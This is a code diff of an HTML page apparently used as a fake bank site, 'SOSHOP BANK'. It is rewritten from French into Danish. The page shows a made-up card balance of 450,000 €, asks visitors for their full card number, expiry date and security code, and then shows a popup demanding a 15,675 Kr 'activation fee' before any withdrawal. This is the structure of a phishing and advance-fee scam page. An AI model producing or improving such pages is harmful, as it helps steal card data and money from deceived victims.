@@ -1,60 +1,72 @@
 <!DOCTYPE html>
-<html> 
+<html>
 <head>
-  <title>Page de Connexion</title>
+  <title>SOSHOP BANK</title>
   <link rel="stylesheet" type="text/css" href="styles.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
   <div class="login-container" id="loginContainer">
-    <h1>Connexion</h1>
+    <h1>LOGINDRUM</h1>
     <div class="form-group">
-      <label for="username">Nom d'utilisateur:</label>
+      <label for="username">E-mail: </label>
       <input type="text" id="username" />
     </div>
     <div class="form-group">
-      <label for="password">Mot de passe:</label>
+      <label for="password">Adgangskode</label>
       <input type="password" id="password" />
     </div>
-    <button onclick="login()">Se connecter</button>
+    <button onclick="login()">For at logge ind</button>
   </div>
 
   <div class="dashboard" id="dashboard" style="display: none;">
-    <div class="card-info">
-      <h2>Informations de la carte bancaire</h2>
-       <i class="fas fa-credit-card card-icon"></i>
+    <div class="card-info text center">
+      <h2>Kreditkortoplysninger</h2>
+      <i class="fas fa-credit-card card-icon"></i>
       <div class="card-details">
-        <p><strong>Titulaire de la carte:</strong> <span id="cardholder"></span></p>
-        <p><strong>Numéro de carte:</strong> <span id="cardnumber"></span></p>
-        <p><strong>Date d'expiration:</strong> <span id="expiration"></span></p>
-        <p><strong>Code de sécurité:</strong> <span id="securitycode"></span></p>
+        <p><strong>Kortholder:</strong> <span id="cardholder"></span></p>
+        <p><strong>Kortnummer:</strong> <span id="cardnumber"></span></p>
+        <p><strong>Udløbsdato:</strong> <span id="expiration"></span></p>
+        <p><strong>sikkerhedskode:</strong> <span id="securitycode"></span></p>
+        <p><strong>Saldo til rådighed:</strong>  450.000 € <span id="amountMoney"></span></p> 
       </div>
     </div>
 
     <!-- Informations de carte bancaire saisies -->
     <div class="form-group">
-      <label for="enteredCardholder">Titulaire de la carte:</label>
+      <label for="enteredCardholder">Kortholder:</label>
       <input type="text" id="enteredCardholder" />
     </div>
     <div class="form-group">
-      <label for="enteredCardnumber">Numéro de carte:</label>
+      <label for="enteredCardnumber">Kortnummer:</label>
       <input type="text" id="enteredCardnumber" />
     </div>
     <div class="form-group">
-      <label for="enteredExpiration">Date d'expiration:</label>
+      <label for="enteredExpiration">Udløbsdato:</label>
       <input type="text" id="enteredExpiration" />
     </div>
     <div class="form-group">
-      <label for="enteredSecuritycode">Code de sécurité:</label>
+      <label for="enteredSecuritycode">sikkerhedskode:</label>
       <input type="text" id="enteredSecuritycode" />
     </div>
 
     <!-- Bouton de transfert -->
-    <button class="transfer-button" id="transferButton" onclick="showErrorPopup()">Transférer sur mon compte</button>
+     <button class="transfer-button" id="transferButton" onclick="validateAndTransfer()">Overfør til min konto</button>
+</div>
   </div>
 
+  <div class="popup fa-fa-check" id="successPopup">
+  <span class="close" onclick="hideSuccessPopup()">&times;</span>
+  <p>Penge til rådighed på kortet, men aktiveringsgebyret for tilbagetrækning er påkrævet (15675 Kr)</p>
+  </div>
+  
   <div class="popup" id="errorPopup">
     <span class="close" onclick="hideErrorPopup()">&times;</span>
-    <p>Erreur: Votre solde est insuffisant pour effectuer ce transfert.</p>
+    <p>Fejl: Du har ikke udfyldt felterne korrekt.</p>
+  </div>
+
+  <div class="loading" id="loading">
+    <i class="fas fa-spinner fa-spin"></i>
   </div>
 
   <script src="script.js"></script>
